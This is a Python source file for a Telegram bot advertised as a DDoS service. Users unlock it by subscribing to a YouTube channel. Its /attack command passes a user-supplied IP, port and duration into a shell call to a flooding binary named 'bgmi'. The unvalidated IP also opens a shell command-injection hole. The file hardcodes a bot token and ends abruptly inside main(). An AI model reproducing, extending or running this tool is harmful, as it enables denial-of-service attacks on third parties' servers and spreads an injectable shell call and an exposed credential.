import asyncio
import os
import json
import time
import re
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext, CallbackQueryHandler, filters

# ============= CONFIGURATION =============
TELEGRAM_BOT_TOKEN = '8179448288:AAGzOSPYhhGjUiTr2h-UMzbaSPmYnAaUjbY'
ADMIN_USER_ID = 7352008650

# YouTube Channel Settings
YOUTUBE_CHANNEL_HANDLE = "@Roxz_gaming"
YOUTUBE_CHANNEL_LINK = "https://youtube.com/@Roxz_gaming"
YOUTUBE_CHANNEL_NAME = "Roxz_gaming"

# Bot Settings
REQUIRED_SUBSCRIBERS = 1000
USERS_FILE = 'users.txt'
PENDING_FILE = 'pending_verification.json'
VERIFIED_FILE = 'verified_users.json'
LAST_COUNT_FILE = 'last_subscriber_count.txt'
SUBSCRIBER_HISTORY_FILE = 'subscriber_history.json'

# Attack settings
attack_in_progress = False
bot_start_time = datetime.now()

# ============= FILE HANDLING =============
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return set(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        return set()

def save_users(users):
    try:
        with open(USERS_FILE, 'w') as f:
            for user in users:
                f.write(f"{user}\n")
    except Exception:
        pass

def load_pending():
    try:
        with open(PENDING_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_pending(pending):
    try:
        with open(PENDING_FILE, 'w') as f:
            json.dump(pending, f, indent=4)
    except Exception:
        pass

def load_verified():
    try:
        with open(VERIFIED_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_verified(verified):
    try:
        with open(VERIFIED_FILE, 'w') as f:
            json.dump(verified, f, indent=4)
    except Exception:
        pass

def get_last_count():
    try:
        with open(LAST_COUNT_FILE, 'r') as f:
            return int(f.read().strip())
    except (FileNotFoundError, ValueError):
        return 0

def save_last_count(count):
    try:
        with open(LAST_COUNT_FILE, 'w') as f:
            f.write(str(count))
    except Exception:
        pass

def load_subscriber_history():
    try:
        with open(SUBSCRIBER_HISTORY_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_subscriber_history(history):
    try:
        with open(SUBSCRIBER_HISTORY_FILE, 'w') as f:
            json.dump(history, f, indent=4)
    except Exception:
        pass

users = load_users()
pending_verification = load_pending()
verified_users = load_verified()
subscriber_history = load_subscriber_history()

# ============= AUTO SUBSCRIBER FETCH =============
def fetch_youtube_subscribers():
    try:
        channel_url = f"https://www.youtube.com/{YOUTUBE_CHANNEL_HANDLE}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        response = requests.get(channel_url, headers=headers, timeout=10)
        
        patterns = [
            r'"subscriberCountText":.*?"(\d+(?:\.\d+)?[KMB]?)"',
            r'(\d+(?:\.\d+)?[KMB]?)\s+subscribers',
            r'<meta itemprop="subscriberCount" content="(\d+)"',
            r'(\d+(?:\.\d+)?[KMB]?)\s+subscriber',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                count_str = match.group(1)
                return parse_count_string(count_str)
    except Exception as e:
        print(f"Fetch failed: {e}")
    return get_last_count()

def parse_count_string(count_str):
    count_str = count_str.upper().strip()
    if 'K' in count_str:
        return int(float(count_str.replace('K', '')) * 1000)
    elif 'M' in count_str:
        return int(float(count_str.replace('M', '')) * 1000000)
    elif 'B' in count_str:
        return int(float(count_str.replace('B', '')) * 1000000000)
    else:
        num_str = re.sub(r'[^\d]', '', count_str)
        return int(num_str) if num_str else 0

def get_current_subs():
    count = fetch_youtube_subscribers()
    if count > 0:
        last_count = get_last_count()
        if count != last_count:
            save_last_count(count)
            check_subscriber_increase(last_count, count)
        return count
    return get_last_count()

def check_subscriber_increase(old_count, new_count):
    """Check if subscriber count increased"""
    if new_count > old_count:
        increase = new_count - old_count
        print(f"📈 Subscriber increased by {increase}! New count: {new_count}")
        return increase
    return 0

def get_previous_count():
    return get_last_count()

def has_subscriber_increased():
    current = get_current_subs()
    previous = get_previous_count()
    return current > previous, current - previous

# ============= COMMANDS =============

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    first_name = update.effective_user.first_name or "Warrior"
    
    current_subs = get_current_subs()
    
    # Check if already verified
    if user_id in users or user_id == str(ADMIN_USER_ID):
        keyboard = [
            [InlineKeyboardButton("⚔️ ATTACK", callback_data="attack_help")],
            [InlineKeyboardButton("📊 STATS", callback_data="stats")],
            [InlineKeyboardButton("📜 ABOUT", callback_data="about")],
            [InlineKeyboardButton("🆘 SUPPORT", callback_data="support")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"✅ Welcome back {first_name}!\n\nYou are already verified. Use /attack to start DDoS attacks.",
            reply_markup=reply_markup
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("🎯 SUBSCRIBE NOW", url=YOUTUBE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE SUBSCRIBED", callback_data="check_subscription")],
        [InlineKeyboardButton("📊 CHECK PROGRESS", callback_data="check_count")],
        [InlineKeyboardButton("📢 SHARE BOT", callback_data="share_bot")],
        [InlineKeyboardButton("❓ HELP", callback_data="help_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = f"""
🔥 ROXZ DDOS BOT 🔥

Welcome {first_name}!

{'🔒 BOT IS LOCKED' if current_subs < REQUIRED_SUBSCRIBERS else '🎉 BOT IS UNLOCKED'} 🎉

📊 SUBSCRIBER PROGRESS:
├ Required: {REQUIRED_SUBSCRIBERS:,}
├ Current: {current_subs:,}
└ Remaining: {max(0, REQUIRED_SUBSCRIBERS - current_subs):,}

{'⚠️ TARGET NOT COMPLETED YET! ⚠️' if current_subs < REQUIRED_SUBSCRIBERS else '✅ TARGET COMPLETED! ✅'}

{'HOW TO GET ACCESS:' if current_subs < REQUIRED_SUBSCRIBERS else 'TO GET VERIFIED:'}

1️⃣ Subscribe to YouTube channel
2️⃣ Click "I HAVE SUBSCRIBED" button  
3️⃣ Send screenshot
4️⃣ Bot will verify and send request to admin

📢 HELP US REACH THE TARGET:
Share this bot with your friends!
Every subscriber helps unlock the bot faster.

Channel: {YOUTUBE_CHANNEL_NAME}
Link: {YOUTUBE_CHANNEL_LINK}

{'⏳ Please wait for target to complete...' if current_subs < REQUIRED_SUBSCRIBERS else '✅ Target achieved! Get verified now!'}
"""
    
    await context.bot.send_message(chat_id=chat_id, text=message, reply_markup=reply_markup)

async def check_subscription_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    first_name = query.from_user.first_name
    username = query.from_user.username or "No username"
    chat_id = query.message.chat.id
    
    # Check if already verified
    if user_id in users:
        await query.edit_message_text("✅ You are already verified! Use /attack to start.")
        return
    
    # Check if already pending
    if user_id in pending_verification:
        await query.edit_message_text("⏳ Your verification is already pending! Please wait for admin approval.")
        return
    
    # Get current subscriber count
    current_subs = get_current_subs()
    previous_subs = get_previous_count()
    
    # Store user's request with current count
    pending_verification[user_id] = {
        "name": first_name,
        "user_id": user_id,
        "username": username,
        "timestamp": time.time(),
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": "awaiting_screenshot",
        "subs_at_request": current_subs
    }
    save_pending(pending_verification)
    
    await query.edit_message_text(
        f"📸 VERIFICATION PROCESS STARTED!\n\n"
        f"Current subscribers: {current_subs:,}\n"
        f"Target: {REQUIRED_SUBSCRIBERS:,}\n\n"
        f"Please send a CLEAR SCREENSHOT showing you are subscribed to:\n"
        f"{YOUTUBE_CHANNEL_NAME}\n\n"
        f"⚠️ IMPORTANT: Bot will verify if subscriber count has increased after your subscription!\n\n"
        f"Send the screenshot as a photo in this chat."
    )

async def handle_screenshot(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    chat_id = update.effective_chat.id
    first_name = update.effective_user.first_name
    username = update.effective_user.username or "No username"
    
    # Check if already verified
    if user_id in users:
        await context.bot.send_message(chat_id=chat_id, text="✅ You are already verified! Use /attack to start.")
        return
    
    # Check if user has pending request
    if user_id not in pending_verification:
        await context.bot.send_message(
            chat_id=chat_id,
            text="⚠️ Please click 'I HAVE SUBSCRIBED' button first before sending screenshot!\n\nUse /start to begin."
        )
        return
    
    # Get current and previous subscriber counts
    current_subs = get_current_subs()
    previous_subs = get_previous_count()
    
    # Check if subscriber count increased
    increased, increase_amount = has_subscriber_increased()
    
    # Also check if user's subscription might have caused increase
    # Wait 2 seconds to ensure count updates
    await asyncio.sleep(2)
    current_subs_fresh = get_current_subs()
    
    # Check if count increased after user's request
    request_data = pending_verification[user_id]
    subs_at_request = request_data.get("subs_at_request", previous_subs)
    
    count_increased = current_subs_fresh > subs_at_request
    
    if not count_increased:
        # Fake screenshot detected
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ FAKE SCREENSHOT DETECTED! ❌\n\n"
                 f"Subscriber count did NOT increase!\n\n"
                 f"Previous count: {subs_at_request:,}\n"
                 f"Current count: {current_subs_fresh:,}\n"
                 f"No change detected.\n\n"
                 f"⚠️ You must ACTUALLY subscribe to the channel!\n\n"
                 f"📺 Channel: {YOUTUBE_CHANNEL_NAME}\n"
                 f"🔗 Link: {YOUTUBE_CHANNEL_LINK}\n\n"
                 f"After subscribing, click 'I HAVE SUBSCRIBED' again and send a new screenshot.\n\n"
                 f"🔗 @Roxz_gaming"
        )
        
        # Remove from pending
        if user_id in pending_verification:
            del pending_verification[user_id]
            save_pending(pending_verification)
        return
    
    # Valid screenshot - count increased
    # Save screenshot
    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)
    
    os.makedirs("screenshots", exist_ok=True)
    screenshot_path = f"screenshots/{user_id}_{int(time.time())}.jpg"
    await file.download_to_drive(screenshot_path)
    
    # Update pending verification
    pending_verification[user_id]["screenshot"] = screenshot_path
    pending_verification[user_id]["screenshot_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    pending_verification[user_id]["status"] = "pending_approval"
    pending_verification[user_id]["subs_after_screenshot"] = current_subs_fresh
    save_pending(pending_verification)
    
    # Check if target is completed
    target_completed = current_subs_fresh >= REQUIRED_SUBSCRIBERS
    
    if target_completed:
        target_message = f"✅ TARGET ACHIEVED! {current_subs_fresh:,}/{REQUIRED_SUBSCRIBERS:,}"
    else:
        remaining = REQUIRED_SUBSCRIBERS - current_subs_fresh
        target_message = f"⏳ Target: {current_subs_fresh:,}/{REQUIRED_SUBSCRIBERS:,} (Need {remaining} more)"
    
    # Notify user
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"✅ SUBSCRIPTION VERIFIED! ✅\n\n"
             f"Subscriber count increased from {subs_at_request:,} to {current_subs_fresh:,}!\n\n"
             f"{target_message}\n\n"
             f"{'🎉 Congratulations! Target completed!' if target_completed else '⚠️ Target not completed yet!'}\n\n"
             f"{'You will be verified by admin shortly.' if target_completed else 'Please wait for target to complete. Share the bot to help reach the target faster!'}\n\n"
             f"📢 Share this bot with your friends: https://t.me/{(await context.bot.get_me()).username}\n\n"
             f"🔗 @Roxz_gaming"
    )
    
    # Send to admin for approval (only if target completed)
    if target_completed:
        keyboard = [
            [InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{user_id}"),
             InlineKeyboardButton("❌ REJECT", callback_data=f"reject_{user_id}")]
        ]
        admin_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_photo(
            chat_id=ADMIN_USER_ID,
            photo=photo.file_id,
            caption=f"🆕 NEW VERIFICATION REQUEST\n\n"
                    f"👤 Name: {first_name}\n"
                    f"🆔 ID: {user_id}\n"
                    f"📝 Username: @{username}\n"
                    f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"📊 Subscribers: {current_subs_fresh:,}/{REQUIRED_SUBSCRIBERS:,}\n"
                    f"✅ Target Completed!\n\n"
                    f"Verify screenshot and approve/reject.",
            reply_markup=admin_markup
        )
        
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=f"🆕 User {first_name} (@{username}) has requested verification!\nUse the buttons on the photo to approve/reject."
        )
    else:
        # Target not completed - store for later
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=f"📝 PENDING VERIFICATION (Target Incomplete)\n\n"
                 f"👤 Name: {first_name}\n"
                 f"🆔 ID: {user_id}\n"
                 f"📝 Username: @{username}\n"
                 f"📊 Subscribers: {current_subs_fresh:,}/{REQUIRED_SUBSCRIBERS:,}\n"
                 f"Status: Waiting for target completion\n\n"
                 f"This user will be automatically verified when target is reached."
        )
        
        # Add to waiting list
        waiting_file = 'waiting_users.json'
        try:
            with open(waiting_file, 'r') as f:
                waiting_users = json.load(f)
        except:
            waiting_users = {}
        
        waiting_users[user_id] = pending_verification[user_id]
        with open(waiting_file, 'w') as f:
            json.dump(waiting_users, f, indent=4)

async def admin_approval_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data.startswith("approve_"):
        user_id = data.replace("approve_", "")
        
        if user_id in pending_verification:
            # Add to verified users
            users.add(user_id)
            save_users(users)
            
            # Add to verified dict
            verified_users[user_id] = pending_verification[user_id]
            verified_users[user_id]["verified_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            verified_users[user_id]["attacks"] = 0
            save_verified(verified_users)
            
            user_name = pending_verification[user_id].get("name", "User")
            
            # Remove from pending
            del pending_verification[user_id]
            save_pending(pending_verification)
            
            # Notify user
            await context.bot.send_message(
                chat_id=int(user_id),
                text=f"✅ VERIFICATION APPROVED! ✅\n\n"
                     f"Congratulations {user_name}! You are now verified.\n\n"
                     f"You can now use:\n"
                     f"/attack <IP> <PORT> <TIME>\n\n"
                     f"Example: /attack 1.1.1.1 80 60\n\n"
                     f"Type /help for more commands.\n\n"
                     f"🔗 @Roxz_gaming"
            )
            
            # Update admin message
            await query.edit_message_caption(
                caption=f"✅ APPROVED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"User {user_name} has been verified and can now use the bot."
            )
            
            await context.bot.send_message(
                chat_id=ADMIN_USER_ID,
                text=f"✅ User {user_name} ({user_id}) has been approved successfully!"
            )
    
    elif data.startswith("reject_"):
        user_id = data.replace("reject_", "")
        
        if user_id in pending_verification:
            user_name = pending_verification[user_id].get("name", "User")
            
            # Notify user
            await context.bot.send_message(
                chat_id=int(user_id),
                text=f"❌ VERIFICATION REJECTED! ❌\n\n"
                     f"Sorry {user_name}, your verification request was rejected.\n\n"
                     f"Possible reasons:\n"
                     f"• Screenshot not clear\n"
                     f"• Fake or edited screenshot\n"
                     f"• Not properly subscribed\n\n"
                     f"Please subscribe properly and try again using /start\n\n"
                     f"🔗 @Roxz_gaming"
            )
            
            # Remove from pending
            del pending_verification[user_id]
            save_pending(pending_verification)
            
            # Update admin message
            await query.edit_message_caption(
                caption=f"❌ REJECTED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"User {user_name}'s request has been rejected."
            )

async def add_user_command(update: Update, context: CallbackContext):
    """Admin command to manually add user by ID"""
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Only admin can use this command!")
        return
    
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Usage: /adduser <user_id>\n\nExample: /adduser 7352008650")
        return
    
    user_id = args[0]
    
    # Add to users
    users.add(user_id)
    save_users(users)
    
    # Add to verified
    if user_id not in verified_users:
        verified_users[user_id] = {
            "name": "Manual Add",
            "user_id": user_id,
            "verified_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "attacks": 0,
            "manual_add": True
        }
        save_verified(verified_users)
    
    # Remove from pending if exists
    if user_id in pending_verification:
        del pending_verification[user_id]
        save_pending(pending_verification)
    
    await update.message.reply_text(f"✅ User {user_id} has been added successfully!")
    
    # Notify user
    try:
        await context.bot.send_message(
            chat_id=int(user_id),
            text=f"✅ You have been manually verified by admin!\n\n"
                 f"You can now use the bot.\n"
                 f"Type /help for commands.\n\n"
                 f"🔗 @Roxz_gaming"
        )
    except:
        pass

async def remove_user_command(update: Update, context: CallbackContext):
    """Admin command to manually remove user"""
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Only admin can use this command!")
        return
    
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Usage: /removeuser <user_id>")
        return
    
    user_id = args[0]
    
    # Remove from users
    users.discard(user_id)
    save_users(users)
    
    # Remove from verified
    if user_id in verified_users:
        del verified_users[user_id]
        save_verified(verified_users)
    
    await update.message.reply_text(f"✅ User {user_id} has been removed successfully!")

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress
    
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    
    # Check if user is verified or admin
    if user_id not in users and chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ You are not verified!\n\nUse /start to get verified.\n\n🔗 @Roxz_gaming"
        )
        return
    
    if attack_in_progress:
        await context.bot.send_message(
            chat_id=chat_id,
            text="⚠️ Another attack is in progress! Please wait..."
        )
        return
    
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text="⚠️ Usage: /attack <IP> <PORT> <TIME>\n\n"
                 "Example: /attack 1.1.1.1 80 60\n\n"
                 "Parameters:\n"
                 "• IP: Target IP address\n"
                 "• PORT: Port number (1-65535)\n"
                 "• TIME: Duration in seconds (5-300)\n\n"
                 "🔗 @Roxz_gaming"
        )
        return
    
    ip, port, duration = args
    
    # Validate port
    try:
        port_int = int(port)
        if port_int < 1 or port_int > 65535:
            raise ValueError
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="❌ Invalid port! Use 1-65535")
        return
    
    # Validate duration
    try:
        duration_int = int(duration)
        if duration_int < 5 or duration_int > 300:
            raise ValueError
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="❌ Invalid duration! Use 5-300 seconds")
        return
    
    # Update attack count
    if user_id in verified_users:
        verified_users[user_id]['attacks'] = verified_users[user_id].get('attacks', 0) + 1
        save_verified(verified_users)
    
    # Send attack started message
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"⚔️ ATTACK LAUNCHED! ⚔️\n\n"
             f"Target: {ip}:{port}\n"
             f"Duration: {duration} seconds\n"
             f"Method: UDP/TCP Hybrid\n\n"
             f"🔥 Attack in progress...\n"
             f"You will be notified when complete.\n\n"
             f"🔗 @Roxz_gaming"
    )
    
    attack_in_progress = True
    
    # Execute attack
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await process.communicate()
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: {str(e)}")
    finally:
        attack_in_progress = False
        attacks_count = verified_users.get(user_id, {}).get('attacks', 0)
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"✅ ATTACK COMPLETED! ✅\n\n"
                 f"Target: {ip}:{port}\n"
                 f"Duration: {duration} seconds\n"
                 f"Packets Sent: ~{duration_int * 5000}\n\n"
                 f"Your total attacks: {attacks_count}\n\n"
                 f"Use /attack again for next target.\n\n"
                 f"🔗 @Roxz_gaming"
        )

async def broadcast_command(update: Update, context: CallbackContext):
    """Admin command to broadcast to all users"""
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Only admin can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /broadcast <message>\n\n"
            "Examples:\n"
            "/broadcast Hello everyone!\n"
            "/broadcast New update available!\n\n"
            "To send to specific users:\n"
            "/broadcast_user <user_id> <message>"
        )
        return
    
    message = ' '.join(context.args)
    success = 0
    failed = 0
    
    status_msg = await update.message.reply_text("📢 Broadcasting message to all users...")
    
    for user_id in users:
        try:
            await context.bot.send_message(
                chat_id=int(user_id),
                text=f"📢 BROADCAST MESSAGE 📢\n\n{message}\n\n🔗 @Roxz_gaming"
            )
            success += 1
            await asyncio.sleep(0.1)  # Avoid flooding
        except Exception as e:
            failed += 1
    
    await status_msg.edit_text(
        f"✅ Broadcast completed!\n\n"
        f"✓ Sent: {success} users\n"
        f"✗ Failed: {failed} users\n"
        f"📊 Total users: {len(users)}"
    )

async def broadcast_user_command(update: Update, context: CallbackContext):
    """Admin command to broadcast to specific user"""
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Only admin can use this command!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /broadcast_user <user_id> <message>")
        return
    
    user_id = args[0]
    message = ' '.join(args[1:])
    
    try:
        await context.bot.send_message(
            chat_id=int(user_id),
            text=f"📢 MESSAGE FROM ADMIN 📢\n\n{message}\n\n🔗 @Roxz_gaming"
        )
        await update.message.reply_text(f"✅ Message sent to user {user_id}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send message: {str(e)}")

async def help_command(update: Update, context: CallbackContext):
    help_text = """
🔥 ROXZ DDOS BOT HELP 🔥

━━━━━━━━━━━━━━━━━━━━━━

📌 USER COMMANDS:

/start - Start the bot
/help - Show this help
/attack <IP> <PORT> <TIME> - Launch DDoS attack
/status - Check your verification status
/stats - View bot statistics
/about - About the bot
/methods - Attack methods

━━━━━━━━━━━━━━━━━━━━━━

⚔️ ATTACK EXAMPLE:

/attack 1.1.1.1 80 60

PARAMETERS:
• IP: Target IP address
• PORT: 1-65535 (80 for web, 443 for HTTPS)
• TIME: 5-300 seconds

━━━━━━━━━━━━━━━━━━━━━━

👑 ADMIN COMMANDS:

/adduser <user_id> - Manually add user
/removeuser <user_id> - Remove user
/pending - View pending requests
/broadcast <msg> - Send to all users
/broadcast_user <id> <msg> - Send to specific user
/refresh - Update subscriber count
/stats - Bot statistics

━━━━━━━━━━━━━━━━━━━━━━

📢 SHARE THIS BOT:
https://t.me/{(await context.bot.get_me()).username}

🔗 @Roxz_gaming
"""
    await update.message.reply_text(help_text)

async def status_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    
    if user_id in users:
        attacks = verified_users.get(user_id, {}).get('attacks', 0)
        verified_at = verified_users.get(user_id, {}).get('verified_at', 'Unknown')
        
        await update.message.reply_text(
            f"✅ YOUR STATUS ✅\n\n"
            f"Verification: APPROVED\n"
            f"Attacks done: {attacks}\n"
            f"Verified on: {verified_at}\n"
            f"Rank: {'🔥 PRO' if attacks > 100 else '⚡ BEGINNER'}\n\n"
            f"Ready to attack! Use /attack\n\n"
            f"🔗 @Roxz_gaming"
        )
    elif user_id in pending_verification:
        status = pending_verification[user_id].get('status', 'pending')
        subs_at = pending_verification[user_id].get('subs_at_request', 0)
        
        await update.message.reply_text(
            f"⏳ YOUR STATUS ⏳\n\n"
            f"Verification: PENDING\n"
            f"Status: {status}\n"
            f"Requested on: {pending_verification[user_id].get('date', 'Unknown')}\n"
            f"Subscribers at request: {subs_at}\n\n"
            f"Please wait for target completion and admin approval.\n\n"
            f"🔗 @Roxz_gaming"
        )
    else:
        await update.message.reply_text(
            f"❌ NOT VERIFIED\n\n"
            f"Use /start to begin verification process.\n\n"
            f"🔗 @Roxz_gaming"
        )

async def stats_command_handler(update: Update, context: CallbackContext):
    current_subs = get_current_subs()
    total_attacks = sum(v.get('attacks', 0) for v in verified_users.values())
    
    await update.message.reply_text(
        f"📊 BOT STATISTICS 📊\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📺 SUBSCRIBERS:\n"
        f"├ Target: {REQUIRED_SUBSCRIBERS:,}\n"
        f"├ Current: {current_subs:,}\n"
        f"└ Remaining: {max(0, REQUIRED_SUBSCRIBERS - current_subs):,}\n\n"
        f"👥 USERS:\n"
        f"├ Verified: {len(users)}\n"
        f"├ Pending: {len(pending_verification)}\n"
        f"└ Total Attacks: {total_attacks}\n\n"
        f"🟢 SYSTEM:\n"
        f"├ Status: {'🟢 ONLINE' if current_subs >= REQUIRED_SUBSCRIBERS else '🟡 WAITING'}\n"
        f"├ Uptime: {get_bot_uptime()}\n"
        f"└ Attack Active: {'✅' if attack_in_progress else '❌'}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 @Roxz_gaming"
    )

async def about_command(update: Update, context: CallbackContext):
    await update.message.reply_text(
        f"🔥 ROXZ DDOS BOT 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Version: 3.0.0\n"
        f"Owner: @Roxz_gaming\n"
        f"Channel: {YOUTUBE_CHANNEL_NAME}\n\n"
        f"FEATURES:\n"
        f"✅ Layer 4/7 DDoS Protection Bypass\n"
        f"✅ UDP/TCP/HTTP Flood Methods\n"
        f"✅ 10Gbps+ Attack Power\n"
        f"✅ 24/7 Support\n"
        f"✅ Anonymous & Secure\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Type /help for commands\n"
        f"🔗 @Roxz_gaming"
    )

async def methods_command(update: Update, context: CallbackContext):
    await update.message.reply_text(
        f"⚔️ ATTACK METHODS ⚔️\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"LAYER 4 METHODS:\n"
        f"• UDP Flood\n"
        f"• TCP SYN\n"
        f"• TCP ACK\n"
        f"• ICMP Flood\n"
        f"• GRE Flood\n\n"
        f"LAYER 7 METHODS:\n"
        f"• HTTP Flood\n"
        f"• HTTPS Flood\n"
        f"• Slowloris\n"
        f"• RUDY Attack\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"USAGE:\n"
        f"/attack <IP> <PORT> <TIME>\n\n"
        f"Example: /attack 1.1.1.1 80 60\n\n"
        f"🔗 @Roxz_gaming"
    )

async def pending_list(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Only admin can use this command!")
        return
    
    if not pending_verification:
        await update.message.reply_text("📭 No pending verification requests.")
        return
    
    text = "📋 PENDING REQUESTS:\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, data in pending_verification.items():
        text += f"👤 {data.get('name', 'Unknown')}\n"
        text += f"🆔 {uid}\n"
        text += f"📝 @{data.get('username', 'No username')}\n"
        text += f"📅 {data.get('date', 'Unknown')}\n"
        text += f"📸 {'✅ Screenshot received' if 'screenshot' in data else '❌ No screenshot'}\n"
        text += f"📊 Status: {data.get('status', 'Unknown')}\n"
        text += f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    await update.message.reply_text(text)

async def refresh_subs(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Only admin can use this command!")
        return
    
    await update.message.reply_text("🔄 Fetching latest subscriber count...")
    count = fetch_youtube_subscribers()
    await update.message.reply_text(f"✅ Current subscribers: {count:,}")

async def share_bot_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    bot_username = (await context.bot.get_me()).username
    
    await query.edit_message_text(
        f"📢 SHARE THIS BOT 📢\n\n"
        f"Help us reach {REQUIRED_SUBSCRIBERS:,} subscribers!\n\n"
        f"Bot Link: https://t.me/{bot_username}\n\n"
        f"Share this link with your friends.\n"
        f"Every subscriber helps unlock the bot faster!\n\n"
        f"Current progress: {get_current_subs():,}/{REQUIRED_SUBSCRIBERS:,}\n\n"
        f"🔗 @Roxz_gaming"
    )

async def callback_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "check_subscription":
        await check_subscription_callback(update, context)
    elif data == "check_count":
        count = get_current_subs()
        await query.edit_message_text(
            f"📊 SUBSCRIBER COUNT 📊\n\n"
            f"Channel: {YOUTUBE_CHANNEL_NAME}\n"
            f"Subscribers: {count:,}\n"
            f"Target: {REQUIRED_SUBSCRIBERS:,}\n"
            f"Remaining: {max(0, REQUIRED_SUBSCRIBERS - count):,}\n"
            f"Status: {'✅ TARGET COMPLETED' if count >= REQUIRED_SUBSCRIBERS else '🔒 TARGET PENDING'}\n\n"
            f"Use /start to go back.\n\n"
            f"🔗 @Roxz_gaming"
        )
    elif data == "help_menu":
        await help_command(update, context)
    elif data == "stats":
        await stats_command_handler(update, context)
    elif data == "about":
        await about_command(update, context)
    elif data == "support":
        await update.message.reply_text(
            f"🆘 SUPPORT 🆘\n\n"
            f"Contact: @Roxz_gaming\n\n"
            f"For issues, suggestions, or help:\n"
            f"• Bot not working\n"
            f"• Verification problems\n"
            f"• Attack issues\n\n"
            f"Response time: Usually within 5 minutes\n\n"
            f"🔗 @Roxz_gaming"
        )
    elif data == "attack_help":
        await help_command(update, context)
    elif data == "share_bot":
        await share_bot_callback(update, context)
    elif data.startswith("approve_") or data.startswith("reject_"):
        await admin_approval_callback(update, context)

# ============= MAIN =============

def main():
    print("🤖 Starting ROXZ DDOS Bot...")
    print(f"📺 YouTube Channel: {YOUTUBE_CHANNEL_NAME}")
    print(f"🎯 Target: {REQUIRED_SUBSCRIBERS} subscribers")
    print(f"👑 Admin ID: {ADMIN_USER_ID}")
    print("=" * 50)
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stats", stats_command_handler))
    application.add_handler(CommandHandler("about", about_command))
    application.add_handler(CommandHandler("methods", methods_command))
    
    # Admin commands
